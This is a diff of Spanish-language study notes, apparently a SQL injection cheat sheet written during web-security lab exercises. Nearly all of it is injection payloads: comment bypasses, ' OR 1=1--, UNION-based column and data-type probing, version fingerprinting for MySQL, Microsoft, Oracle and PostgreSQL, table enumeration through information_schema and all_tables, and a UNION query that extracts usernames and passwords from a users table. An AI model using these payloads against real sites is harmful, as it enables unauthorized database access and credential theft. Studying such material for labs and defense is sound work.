@@ -11,10 +11,10 @@
 ###> BYPASS COMUNES
 
 -- | dentro del lenguaje de SQL query, sirve para comentar de manera que todo lo que este despues de los simbolos, se ignora.
-ex: SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
+ex: SELECT [columns] FROM products WHERE category = 'Gifts'--' AND released = 1
 
 # | dentro del lenguaje de SQL query, sirve para comentar de manera que todo lo que este despues del simbolo, se ignora.
-ex: SELECT * FROM products WHERE category = 'Gifts'#' AND released = 1
+ex: SELECT [columns] FROM products WHERE category = 'Gifts'#' AND released = 1
 
 ' OR 1=1-- | sirve para crear una consulta a un resultado booleano, de manera que el inicio de la consulta es leido, el resto no ya que
 es siempre TRUE.
@@ -42,29 +42,34 @@ _COMO SABER EL DATA TYPE DE UNA COLUMNA ?
 ORACLE: ' UNION SELECT 'a','a' from DUAL--
 https://docs.oracle.com/database/121/SQLRF/statements_10002.htm
 
-###> IDENTIFICAR INFORMACION DEL MOTOR DE BASE DE DATOS
-(para recolectar informacion de la base de datos, debe estar presente el SQLi UNION Attack donde muestre en respuesta (pantalla) la data). tener 
-en cuenta las columnas !!
+###> IDENTIFICAR INFORMACION DEL MOTOR DE BASE DE DATOS [TIPO/VERSION]
+NOTA: importante saber el numero de columnas y saber cual columna es el formato aceptado, si muestra en pantalla es UNION attack !!
 
-ex: ' UNION SELECT @@version
+  ex: ' UNION SELECT @@version
 
 Microsoft >> SELECT @@version
 MySQL >> SELECT @@version
 Oracle >> SELECT banner FROM v$version | SELECT version FROM v$instance
 PostgreSQL >> SELECT version()
 
-# LISTAR TABLAS DE LA BASE DE DATOS
-[ORACLE no tiene esta opcion]
+###> LISTAR TABLAS DE LA BASE DE DATOS / [Microsoft/MySQL/PostgreSQL]
+NOTA: importante saber el numero de columnas y saber cual columna es el formato aceptado, si muestra en pantalla es UNION attack !!
 
-SELECT * FROM information_schema.tables
-SELECT * FROM information_schema.columns
+SELECT [columns] FROM information_schema.tables | '+UNION+SELECT+table_name,null+FROM+information_schema.tables--
+SELECT [columns] FROM information_schema.columns
 
-# MOSTRAR INFORMACION IMPORTANTE DE DIFERENTE TABLAS [USERS/PASS]
+SELECT [columns] FROM information_schema.columns WHERE table_name = 'users_qmwbqm'
+ 
+###> LISTAR TABLAS DE LA BASE DE DATOS / [Oracle]
 
-importante saber, el numero de columnas y saber cual columna es de tipo string, de manera que permita mostrar en pantalla.
+SELECT [columns] FROM all_tables
+
+SELECT [columns] FROM all_tab_columns WHERE table_name = 'USERS'
+
+###> MOSTRAR INFORMACION IMPORTANTE DE DIFERENTE TABLAS [USERS/PASS]
+NOTA: importante saber el numero de columnas y saber cual columna es el formato aceptado, si muestra en pantalla es UNION attack !!
 
 ex: ' UNION SELECT username, password FROM users--
-
 
 
 
